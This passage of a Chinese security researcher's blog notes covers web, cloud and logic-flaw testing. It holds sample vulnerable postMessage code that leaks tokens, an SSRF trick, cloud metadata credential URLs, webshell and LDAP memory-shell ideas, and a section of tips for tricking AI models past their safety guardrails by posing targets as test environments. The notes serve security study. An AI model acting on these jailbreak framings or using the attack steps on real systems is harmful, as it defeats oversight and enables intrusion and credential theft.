+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 命名参数</span></span><br><span class="line"><span class="type">String</span> <span class="variable">hql</span> <span class="operator">=</span> <span class="string">&quot;from User where name = :name&quot;</span>;</span><br><span class="line">session.createQuery(hql, User.class).setParameter(<span class="string">&quot;name&quot;</span>, name).list();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 位置参数</span></span><br><span class="line"><span class="type">String</span> <span class="variable">hql</span> <span class="operator">=</span> <span class="string">&quot;from User where name = ?1 and status = ?2&quot;</span>;</span><br><span class="line">session.createQuery(hql, User.class).setParameter(<span class="number">1</span>, name).setParameter(<span class="number">2</span>, <span class="number">1</span>).list();</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="鉴权架构"><a href="#鉴权架构" class="headerlink" title="鉴权架构"></a>鉴权架构</h3><p>OAuth阶段会开放很多无需认证的接口，但是报告看起来就很像逻辑洞，比如redirect可能会说任意跳转，实际上可能在网关配置了白名单之类的。再比如裸sso退出等</p>
+<p>B端 用户登录后发起请求 —&gt; bambu-gateway —&gt;解析token获取用户信息 —&gt; 查询rbac角色权限—-&gt;进行请求接口鉴权 —&gt;通过放行&#x2F;不通过异常</p>
+<p>C端 c端用户进行登录 — &gt; 官网后端 —&gt; 官网转发接口到C端网关 —&gt;c端网关仅校验是否登录不用进行权限校验 —&gt;直接请求hub服务</p>
+<p>一般来说都是这么做的，B端走代码访问rbac feign内部接口，C端不做权限管理，直接走nacos访问内部白名单接口</p>
+<h3 id="case"><a href="#case" class="headerlink" title="case"></a>case</h3><p>1、部分Filter直接放行;.js;.css;.jpg;.png，因为这些是静态资源（比如yonbip的lj代码），导致所有后台路由加上.js;前台bypass</p>
+<p>2、xss 用csp禁止了执行外部script脚本，可以用meta强制跳转，也算漏洞</p>
+<p>nextjs 有用next_data块 id标签加载外部js导致xss&#x2F;ssrf的手法，也能绕过csp</p>
+<p>3、AI模型的业务矛盾：AI生成模型展示在前端，为了限制用户无限的生成AI模型，所以在导出模型时会扣掉一些金币，每个月会送一些金币。这个场景有个经典的矛盾：用户需要看到模型，满意后才会进行导出，然后扣掉金币；用户要看到模型，模型已经展示在前端了，那可以通过静态资源直接下载glb模型，导出扣金币的功能形同虚设。如何衡量用户对模型是否满意与限制无限偷用AI下载呢？</p>
+<p>4、是否具有保修状态是根据SN推断的，如果提交别人有保修的SN，那就能免运费寄回来保修。到货了修复大概率也不会核验SN码了</p>
+<p>5、富文本编辑框如果插入外链的图片，通常的逻辑是把图片下载到oss上或者本地，然后再访问，这样才是自己的链，速度也会快一些。那么会有什么问题呢？</p>
+<p>首先富文本编辑框输入后保存上传，前端会有Domify之类的净化（可能单词拼错了但是不重要），会过滤掉一些xss的标签，如<code>&lt;&gt;;</code>，但是众所周知前端的防护屁用没有。抓包修改上传<code>&lt;p&gt;&lt;img src=&quot;http://xxx&quot;&gt;&lt;/p&gt;</code>就会导致嵌入标签。正常来说嵌入img也无所谓对吧，因为富文本编辑框肯定允许img标签，又不是script标签会执行js脚本。但是在这种场景下，下载到oss或者本地会先从该主机访问一次，所以就有ssrf存在，访问转化后的webp或者jpg，就会访问到内网</p>
+<h3 id="SPA-HTML"><a href="#SPA-HTML" class="headerlink" title="SPA HTML"></a>SPA HTML</h3><p>直接粘贴AI</p>
+<p>SPA &#x3D; Single Page Application（单页应用），是一种前端架构。</p>
+<ul>
+<li><p><strong>传统 MPA</strong>：每访问一个 URL，服务器吐一份新 HTML 回来</p>
+<p>每个 URL 一份完整的 HTML 文件，每次切页都是一次完整页面刷新。jQuery 时代的 PHP &#x2F; Spring MVC &#x2F; Django 模板都是这套。</p>
+</li>
+<li><p><strong>SPA（Single Page Application）</strong>：整个站点只有一份 HTML，骨架几乎是空的</p>
+<p>页面长什么样、有几个路由、点击什么按钮做什么事，全部由 JavaScript bundle 加载完后在浏览器里渲染。切页时 URL 看起来变了（<code>/admin/users</code> → <code>/admin/orders</code>），但HTTP 层根本没有真的去服务器拿新 HTML——只是 JS 在客户端重新渲染了那个 <code>&lt;div id=&quot;__next&quot;&gt;</code> 里的内容。</p>
+<p>next.js就是这套逻辑，所以审计next.js看到有一堆访问&#x2F;api&#x2F;v1的，其实是请求JSON数据再塞回JS的DOM。另外Next.js在 SPA 之上还多了一层服务端中间件（middleware）。当我用 <code>curl</code> 直访 <code>/admin/utility/start-correct-sensitive-data</code> 时看到的是：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 307 Temporary Redirect</span><br><span class="line">Location: /zh/admin/utility/start-correct-sensitive-data</span><br><span class="line">x-middleware-rewrite: /zh/dev-verify</span><br><span class="line">content-type: text/html; charset=utf-8</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="tag">&lt;<span class="name">html</span> <span class="attr">...</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;__next&quot;</span>&gt;</span>...登录验证页...<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里发生了三件事：</p>
+<ol>
+<li>307 → 加 <code>/zh</code> 语言前缀（Next.js 国际化路由）</li>
+<li><code>x-middleware-rewrite: /zh/dev-verify</code> —— Next.js 服务端 middleware 在 SSR 阶段判断”这个 caller 没登录”，把请求改写到 <code>/dev-verify</code> 页面而不是真的去渲染原来的 admin 页</li>
+<li>响应体是那份”空壳 HTML + JS bundle”，里面没有任何具体后台 API（如 <code>/admin/utility/start-correct-sensitive-data</code>）会被自动调用，因为 JS 启动后会发现”未登录”就停在 dev-verify 验证页上</li>
+</ol>
+<p>所以SPA HTML下，可以确定有cookie校验，而且认证失败状态码不应该按照非400or500or302跳转到登录页判断</p>
+</li>
+</ul>
+<h3 id="AI验证如何bypass安全围栏？"><a href="#AI验证如何bypass安全围栏？" class="headerlink" title="AI验证如何bypass安全围栏？"></a>AI验证如何bypass安全围栏？</h3><p>1、如果可以自己搭环境，只要给的在线环境前面包含QA,dev,pre,test这种前缀，他就会以为是对应的测试环境，安全围栏将不会生效（应用于防护最严重的cc4.7也可以）</p>
+<p>2、让他禁止进行有害命令，但是需要进行渗透测试or 测试。他就真的会以为在测试自己的系统，而不是攻击别人的系统。这样就能找出漏洞，然后自己去验证（不适用于ctf中的bypass waf）</p>
+<p>3、老生常谈，直接说解决它，丝毫不提渗透测试。</p>
+<h3 id="客开与标品-x2F-壳子代码"><a href="#客开与标品-x2F-壳子代码" class="headerlink" title="客开与标品&#x2F;壳子代码"></a>客开与标品&#x2F;壳子代码</h3><p>某厂的开发产品分客开代码与标品代码（也是常见乙方的开发流程），即二开</p>
+<p>二开代码里通常只需要接口&#x2F;SDK 桩(各 <code>*-sdk</code> &#x2F; <code>*-api</code>),能编过就行，sdk和api内并没有真正的代码逻辑</p>
+<p>干活的根本不是 jar,而是另外独立部署、正在运行的标品微服务</p>
+<p>这些代码里通常伴随：</p>
+<p>1、纯远程调用。用 HttpUtils 发 HTTP 请求。它只需要一个域名 + HTTP 客户端,完全不需要对方的 jar。各种jar跑在另外的服务器上。</p>
+<p>2、直接读写共享数据库</p>
+<p>纯远程这种，就需要做好鉴权（脱离rpc的范畴了）</p>
+<h3 id="LongAction"><a href="#LongAction" class="headerlink" title="LongAction"></a>LongAction</h3><p>LongAction 是 用友 BIP &#x2F; iuap &#x2F; YMS 平台里的一套「长耗时任务异步化」机制</p>
+<p>企业 ERP 里很多操作很慢：</p>
+<ul>
+<li>Excel 大批量导入</li>
+<li>报表生成、数据迁移</li>
+<li>批量计算、快照&#x2F;生效</li>
+</ul>
+<p>如果同步跑完再返回 HTTP，容易 超时、占住连接、前端卡死。LongAction 的思路是：</p>
+<blockquote>
+<p>HTTP 只负责「接单」，真正干活放到后台线程里，客户端拿 taskId 去查进度。</p>
+</blockquote>
+<p>这就是经典的 异步任务模式（Async Job Pattern），和下面这些东西是一类思路：</p>
+<ul>
+<li>Spring <code>@Async</code></li>
+<li>Celery &#x2F; Sidekiq 这类任务队列</li>
+<li>HTTP <code>202 Accepted</code> + <code>Location</code> 查状态</li>
+<li>云 API 的 <code>operationId</code> 轮询</li>
+</ul>
+<p>200 往往只表示 LongAction 已接单；真正有没有写盘、有没有路径穿越、有没有 RCE，要看 异步链路里的 sink，不能只看同步响应。</p>
+<h3 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h3><p>和csrf略有不同，这个是用透明的iframe嵌在一个按钮下面</p>
+<p>验证的话，需要用http起服务，而不是双击点开Html</p>
+<p>而且不是点击后跳转，而是把别人的页面嵌入到了本页面下</p>
+<h3 id="k8s的重启功能"><a href="#k8s的重启功能" class="headerlink" title="k8s的重启功能"></a>k8s的重启功能</h3><p>审sca的时候，通常会忽略内存越界读和dos漏洞，为什么？</p>
+<p>只能读解压缓冲区后面碰巧挨着的内存，不知道能读出来什么，也不能指定地址。可能读到的是：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">堆布局示意图：</span><br><span class="line"></span><br><span class="line">[解压输出缓冲 4KB] [String常量 <span class="string">&quot;OK&quot;</span>] [HashMap的Node] [某个对象的padding]</span><br><span class="line"></span><br><span class="line">​                                    ↑ 碰巧相邻，被泄漏</span><br></pre></td></tr></table></figure>
+
+<p>dos的话除了买了云上的一些防dos服务，还因为用了k8s</p>
+<p>打崩pod → 进程退出 → kubelet 发现 Pod 挂了 → 自动重启，而且k8s还有副本均衡，同时把服务运行在了好几个pod上，崩了一个其他的还能运行</p>
+<p>以及死信队列（微服务里常见的一个的东西</p>
+<h3 id="平台化方案下的安全测试"><a href="#平台化方案下的安全测试" class="headerlink" title="平台化方案下的安全测试"></a>平台化方案下的安全测试</h3><p>比如微信小程序&#x2F;博客园等，每个公众号&#x2F;小程序有自己的子域</p>
+<p>所有开发者把静态资源丢到一个共享的 S3&#x2F;OSS 桶，按 <code>app_id</code> 分目录；CDN 边缘函数根据 host 里的 <code>app_id</code> 把 URL 重写成 <code>s3://&lt;bucket&gt;/&lt;app_id&gt;/&lt;path&gt;</code></p>
+<p>因为每个 app 都引用不同第三方资源（不同 CDN &#x2F; 字体 &#x2F; JS 库），不能给所有 app 配同一份 CSP</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">用户浏览器</span><br><span class="line">  │  https://app_id.wechat.com/foo/index.html</span><br><span class="line">  ▼</span><br><span class="line">CDN（阿里云 ESA / AWS CloudFront）  ──► WAF</span><br><span class="line">  │  边缘函数(EdgeScript / Lambda@Edge)：</span><br><span class="line">  │     1. 从 Host 提取 app_id = &quot;1002&quot;</span><br><span class="line">  │     2. 把 URI 改写为 /1002/foo/index.html</span><br><span class="line">  │     3. 调 CSP API 拿到这个 app 的专属 CSP，写到响应头</span><br><span class="line">  ▼</span><br><span class="line">S3 / OSS  →  /1002/foo/index.html</span><br></pre></td></tr></table></figure>
+
+<p>这里面就有几个必须要加测的东西：</p>
+<p>一个是子域名接管，通常来说子域名接管是 子域名过期后，抢注册一个子域名，实现钓鱼</p>
+<p>这里涉及一个泛域名 <code>*.mwapps.com</code> 问题，需要提前知道一旦解析存在但 S3 桶里没有对应 <code>app_id</code> 目录，行为是什么？</p>
+<p>这里面边缘函数下发csp的鉴权，小程序嵌入主程序的iframe sandbox都需要加测</p>
+<p>另外还需要加测一旦小程序被突破，主程序的安全性问题，也就是看<strong>postMessage</strong>使用：</p>
+<h4 id="postMessage"><a href="#postMessage" class="headerlink" title="postMessage"></a>postMessage</h4><p><code>postMessage</code> 是浏览器提供的 跨窗口通信 API——专门让两个不同 origin 的窗口之间能传消息。</p>
+<p>浏览器的 SOP（同源策略）规定：</p>
+<ul>
+<li><code>fu.net</code> 的 iframe 不能 读 <code>zhu.net</code> 父页的 DOM、cookie、localStorage</li>
+<li>反过来父页也不能读 iframe</li>
+</ul>
+<p>但实际业务里两边经常需要协作，比如：</p>
+<ul>
+<li>iframe 里完成了 3D 建模 → 通知父页”我做完了，告诉用户”</li>
+<li>父页用户关掉了某个面板 → 通知 iframe “你也对应隐藏一下”</li>
+<li>iframe 里点支付 → 父页打开支付窗口</li>
+</ul>
+<p>光有 SOP 这两边永远说不上话。所以浏览器留了 <code>postMessage</code>：只能传消息，不能直接读对方内存。</p>
+<p>安全（理想状态）：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;message&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (e.<span class="property">origin</span> !== <span class="string">&#x27;https://fume.mwapps.net&#x27;</span>) <span class="keyword">return</span>;  *<span class="comment">// ✓*</span></span><br><span class="line">  <span class="keyword">if</span> (e.<span class="property">data</span>.<span class="property">type</span> !== <span class="string">&#x27;expectedType&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">  *<span class="comment">// 只处理已知字段*</span></span><br><span class="line">  <span class="title function_">doSafeThing</span>(e.<span class="property">data</span>.<span class="property">id</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>危险（典型 bug）：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;message&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">  *<span class="comment">// 没有 origin 校验！*</span></span><br><span class="line">  <span class="keyword">if</span> (e.<span class="property">data</span>.<span class="property">type</span> === <span class="string">&#x27;redirect&#x27;</span>) &#123;</span><br><span class="line">​    <span class="variable language_">window</span>.<span class="property">location</span> = e.<span class="property">data</span>.<span class="property">url</span>;       <span class="comment">// ← 任何 iframe / popup 都能让父页跳转</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (e.<span class="property">data</span>.<span class="property">type</span> === <span class="string">&#x27;getUserToken&#x27;</span>) &#123;</span><br><span class="line">​    e.<span class="property">source</span>.<span class="title function_">postMessage</span>(<span class="title function_">getToken</span>(), <span class="string">&#x27;*&#x27;</span>);  <span class="comment">// ← 把用户 token 给任何来源！</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>需要下载主站的所有js chunk，搜索addEventListener看下有没有<code>if (e.origin !== window.location.origin) return; </code>（通常需要反js混淆）</p>
+<p>这里还需要区分下origin和site</p>
+<h3 id="origin与site"><a href="#origin与site" class="headerlink" title="origin与site"></a>origin与site</h3><table>
+<thead>
+<tr>
+<th align="left">概念</th>
+<th align="left">定义</th>
+<th align="left"><code>fu.apps.com</code> vs <code>zhu.apps.com</code></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">origin（源）</td>
+<td align="left">scheme + host + port 全相等</td>
+<td align="left">不同（host 不同）</td>
+</tr>
+<tr>
+<td align="left">site（站点）</td>
+<td align="left">注册域 eTLD+1</td>
+<td align="left">相同（都是 <code>apps.com</code>）</td>
+</tr>
+</tbody></table>
+<p>csrf的same-site防御只对不同site生效，在同site下失效。</p>
+<h3 id="云架构"><a href="#云架构" class="headerlink" title="云架构"></a>云架构</h3><p>正常架构是kong负责鉴权or路由转发，分发到具体的服务是由k8s service完成的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">客户端请求 /api/creation/xxx</span><br><span class="line">        ↓</span><br><span class="line">    【Kong】</span><br><span class="line">    ├── 验证Token/API Key</span><br><span class="line">    ├── 限流检查</span><br><span class="line">    └── 路由转发到 creation-service</span><br><span class="line">        ↓</span><br><span class="line">  【K8s Service】(负载均衡)</span><br><span class="line">    ├── creation-pod-1</span><br><span class="line">    ├── creation-pod-2</span><br><span class="line">    └── creation-pod-3</span><br></pre></td></tr></table></figure>
+
+<p>一般来说zookeeper是服务间调用使用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">creation-service 需要调用 order-service</span><br><span class="line">        ↓</span><br><span class="line">  问Zookeeper：order-service在哪？</span><br><span class="line">        ↓</span><br><span class="line">  Zookeeper返回：192.168.1.100:8080</span><br><span class="line">        ↓</span><br><span class="line">  直接调用 order-service</span><br></pre></td></tr></table></figure>
+
+<p>网关类</p>
+<table>
+<thead>
+<tr>
+<th>产品</th>
+<th>语言</th>
+<th>特点</th>
+<th>适用场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Kong</strong></td>
+<td>Lua&#x2F;Go</td>
+<td>插件生态丰富</td>
+<td>企业API管理</td>
+</tr>
+<tr>
+<td><strong>APISIX</strong></td>
+<td>Lua&#x2F;Go</td>
+<td>国产高性能</td>
+<td>高并发API场景</td>
+</tr>
+<tr>
+<td><strong>Nginx</strong></td>
+<td>C</td>
+<td>轻量稳定</td>
+<td>反向代理&#x2F;简单路由</td>
+</tr>
+<tr>
+<td><strong>Traefik</strong></td>
+<td>Go</td>
+<td>云原生友好</td>
+<td>K8s自动发现路由</td>
+</tr>
+<tr>
+<td><strong>Spring Cloud Gateway</strong></td>
+<td>Java</td>
+<td>Java生态集成好</td>
+<td>Spring微服务</td>
+</tr>
+<tr>
+<td><strong>Zuul</strong></td>
+<td>Java</td>
+<td>Netflix开源</td>
+<td>Spring老项目</td>
+</tr>
+<tr>
+<td><strong>Envoy</strong></td>
+<td>C++</td>
+<td>高性能</td>
+<td>Service Mesh数据面</td>
+</tr>
+<tr>
+<td><strong>HAProxy</strong></td>
+<td>C</td>
+<td>超高性能</td>
+<td>四层&#x2F;七层负载均衡</td>
+</tr>
+</tbody></table>
+<p>服务间协调类</p>
+<table>
+<thead>
+<tr>
+<th>产品</th>
+<th>语言</th>
+<th>特点</th>
+<th>适用场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Zookeeper</strong></td>
+<td>Java</td>
+<td>稳定成熟</td>
+<td>Kafka&#x2F;Dubbo&#x2F;HBase</td>
+</tr>
+<tr>
+<td><strong>Nacos</strong></td>
+<td>Java</td>
+<td>国产全能</td>
+<td>Spring Cloud&#x2F;Dubbo</td>
+</tr>
+<tr>
+<td><strong>Etcd</strong></td>
+<td>Go</td>
+<td>轻量高可靠</td>
+<td>K8s默认使用</td>
+</tr>
+<tr>
+<td><strong>Consul</strong></td>
+<td>Go</td>
+<td>功能全面</td>
+<td>多数据中心</td>
+</tr>
+<tr>
+<td><strong>Eureka</strong></td>
+<td>Java</td>
+<td>简单易用</td>
+<td>Spring Cloud老项目</td>
+</tr>
+</tbody></table>
+<p>Nacos 有一个 <strong>Web管理界面</strong> 可以看到所有服务列表，容易让人误以为它在”管理”流量，但它实际上只是<strong>记录服务地址</strong>，并不转发任何请求。</p>
+<h3 id="存储桶漏洞"><a href="#存储桶漏洞" class="headerlink" title="存储桶漏洞"></a>存储桶漏洞</h3><p>直接上AI图</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20261018172502321.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20261018172502321.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20261018172502321"></p>
+<p>其中AK是公开信息，类似用户名；SK是密码，不能泄露</p>
+<p>AKSK是长期密钥，所以泄露后果很严重</p>
+<p>STS就是临时凭证，包含以下内容，其中STS包含的AKSK是会过期的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AccessKeyId</span><br><span class="line">SecretAccessKey</span><br><span class="line">SessionToken      ← 临时凭证特有！少了它签名会失败</span><br><span class="line">Expiration        ← 过期时间，通常 15 分钟 ~ 12 小时</span><br></pre></td></tr></table></figure>
+
+<p>而元数据中，就直接包含了AKSK或者当前有效的STS</p>
+<p>比如aws 的 <a target="_blank" rel="noopener" href="http://169.254.169.254/latest/meta-data">http://169.254.169.254/latest/meta-data</a> 阿里云的 <a target="_blank" rel="noopener" href="http://100.100.100.200/latest/meta-data">http://100.100.100.200/latest/meta-data</a></p>
+<p>请求时不用带上Expiration</p>
+<p>如何使用STS和AKSK呢？直接使用对应桶的cli就行了，问AI</p>
+<p>桶常见的就是上传任意文件导致xss&#x2F;钓鱼，sts不过期，权限过大导致未授权之类的，还有签名算法太弱，aksk泄露之类的</p>
+<h4 id="签名"><a href="#签名" class="headerlink" title="签名"></a>签名</h4><p>云 API 走的是 HTTP，密码（SK）<strong>不能直接放进请求里</strong>（会被抓包）。所以用<strong>签名</strong>：把你的请求内容 + SK 一起算一个哈希，服务器用同样算法验证。</p>
+<p>AWS 用 <strong>Signature Version 4</strong>，阿里云用 <strong>HMAC-SHA1&#x2F;SHA256</strong>，逻辑类似：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 把请求(方法+路径+头+body+时间戳)整理成规范字符串</span><br><span class="line">2. 用 SK 做多轮 HMAC 计算出签名</span><br><span class="line">3. 把签名放进 Authorization 头</span><br><span class="line">4. 服务器用你的 AK 找到对应 SK，重新算一遍，一致就通过</span><br></pre></td></tr></table></figure>
+
+<p>最后的结果为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Authorization: AWS4-HMAC-SHA256 Credential=AK.../20250101/us-east-1/s3/aws4_request,</span><br><span class="line">               SignedHeaders=host;x-amz-date,</span><br><span class="line">               Signature=abcd1234...</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>前端 JS 里若出现 <code>generate_presigned_url</code> 或带 <code>X-Amz-Signature</code> 的链接，可能泄露访问权限。</p>
+</li>
+<li><p>预签名 URL 一旦生成，在有效期内<strong>任何人可用</strong>——如果 URL 泄露且指向 PII 文件，就是问题。</p>
+</li>
+</ul>
+<h4 id="如何确定某个存储桶是某个公司的资产"><a href="#如何确定某个存储桶是某个公司的资产" class="headerlink" title="如何确定某个存储桶是某个公司的资产"></a>如何确定某个存储桶是某个公司的资产</h4><p>从公司的固有域名前端js找，反编译app&#x2F;小程序找，cname反查，看桶里面有没有公司的对应业务资产</p>
+<p>cname：可以理解为域名-域名 的dns，一般来说桶会绑定一个static 域名，用于官网等域名进行请求，如果static cname映射到了桶，static又是公司资产，那就OK了</p>
+<h4 id="bucket-policy问题"><a href="#bucket-policy问题" class="headerlink" title="bucket policy问题"></a>bucket policy问题</h4><p>比如某个bucket policy为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;starts-with&quot;, &quot;$key&quot;, &quot;user/123/&quot;]</span><br></pre></td></tr></table></figure>
+
+<p> 然后代码里对 S3 key 里 <code>..</code> 不过滤，导致路径穿越</p>
+<p>还有一个场景是：bucket里面区分了user path，比如&#x2F;api&#x2F;upload&#x2F;user&#x2F;xxx &#x2F;api&#x2F;upload&#x2F;admin&#x2F;xxx </p>
+<p>对$key的policy限制不正确，导致越权写入</p>
+<h4 id="发现公司有超级多的桶，怎么排查风险"><a href="#发现公司有超级多的桶，怎么排查风险" class="headerlink" title="发现公司有超级多的桶，怎么排查风险"></a>发现公司有超级多的桶，怎么排查风险</h4><p>直接调用GetBucketAcl<code>、</code>GetBucketPolicyStatus<code>、</code>GetPublicAccessBlock这种函数，筛选出公开的，再筛选policy有问题的</p>
+<h3 id="sql的外带手法，外带函数"><a href="#sql的外带手法，外带函数" class="headerlink" title="sql的外带手法，外带函数"></a>sql的外带手法，外带函数</h3><p>dns外带有长度限制，需要编码+分块</p>
+<p>linux mysql不能外带，看下能不能into&#x2F;dump outfile写webshell吧</p>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="IDEA-alt-F7搜不到jar包里某类在其他类的用法？"><a href="#IDEA-alt-F7搜不到jar包里某类在其他类的用法？" class="headerlink" title="IDEA alt F7搜不到jar包里某类在其他类的用法？"></a>IDEA alt F7搜不到jar包里某类在其他类的用法？</h3><p>你是否遇到：</p>
+<p>现在是这样的：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CreditCancelServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">CreditCancelService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">oldCreditCancel</span><span class="params">(CreditCancelModel creditCancelModel)</span> &#123;</span><br><span class="line">     Optional.ofNullable(...<span class="keyword">new</span> <span class="title class_">CreditRollbackUsedBillInfoStep</span>())....);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>ctrl+左键能跟进到CreditRollbackUsedBillInfoStep，而且shift+shift也能搜索到，但是进到了CreditRollbackUsedBillInfoStep后alt+F7不能查找改类的用法回去？</p>
+<p>shift shift也只能搜到类名，而搜不到使用该类的地方</p>
+<p>实际上 Alt+F7 在反编译类里找不到用法 —— 因为 IDEA 不为库的字节码建”被引用”索引。DEA 的 Find Usages 索引建立在源码之上。IDEA 默认不会把”一个 jar 的 class 引用了另一个 jar 的 class”这种跨库字节码引用纳入 Find Usages 索引。</p>
+<p>所以，要查找用法，只能反编译成源代码才可以…</p>
+<h3 id="AI不能解决的场景"><a href="#AI不能解决的场景" class="headerlink" title="AI不能解决的场景"></a>AI不能解决的场景</h3><p>在做安全工作的时候，时常思考一个问题，当前AI还有哪些工作，是人类指导才能做到的？</p>
+<p>1、路径爆炸问题</p>
+<p>无论是黑盒，还是白盒，AI都不能完全做到</p>
+<p>2、覆盖率问题</p>
+<p>类似路径爆炸问题</p>
+<p>3、多平台问题</p>
+<p>比如微服务部署的多pod，以及主机安全等</p>
+<h2 id="todo"><a href="#todo" class="headerlink" title="todo"></a>todo</h2><p>改造impacket为UI版，总结域渗透手法</p>
+<p>记录一下可以值得看下的漏洞</p>
+<p>Logback core JNDI（可能不再需要看了，利用难度太高，需要控制配置文件） <a target="_blank" rel="noopener" href="https://github.com/cn-panda/logbackRceDemo">https://github.com/cn-panda/logbackRceDemo</a></p>
+<p>Redisson 反序列化 CVE-2023-42809，这个是从redis接收反序列化流打其他漏洞链，攻击条件基本不太可能，所以不用特别的去写链子了，复现下，找到sink就行了</p>
+<p>activemq 反序列化 CVE-2023-46604 <a target="_blank" rel="noopener" href="https://drun1baby.top/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://drun1baby.top/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p>
+<p>spring4shell</p>
+<p>mchange-commons-java 可用于绕过jndi高版本限制，好像是2026.2年的？可以一看</p>
+<p>page cache提权</p>
+<p>hutool非常丝滑表达式RCE让我大脑开始旋转<a target="_blank" rel="noopener" href="https://github.com/chinabugotech/hutool/issues/3994">https://github.com/chinabugotech/hutool/issues/3994</a></p>
+<p>Feign接口</p>
+<p>Lombok到底是什么？</p>
+<p>ldap打内存马，说是直接修改ldapserver里的javaSerializedData就OK了？entry.addAttribute(“javaSerializedData”, payload);</p>
+<p>漏洞平台新姿势：<a target="_blank" rel="noopener" href="https://undercodetesting.com/">https://undercodetesting.com/</a></p>
+
+      </div>
+      <div class="post-tags-categories">
+        
+      </div>
+      
+        <div class="copyright">
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+    <strong>作者:  </strong>GodownKai</a>
+    </li>
+    <li class="post-copyright-link">
+    <strong>文章链接:  </strong>
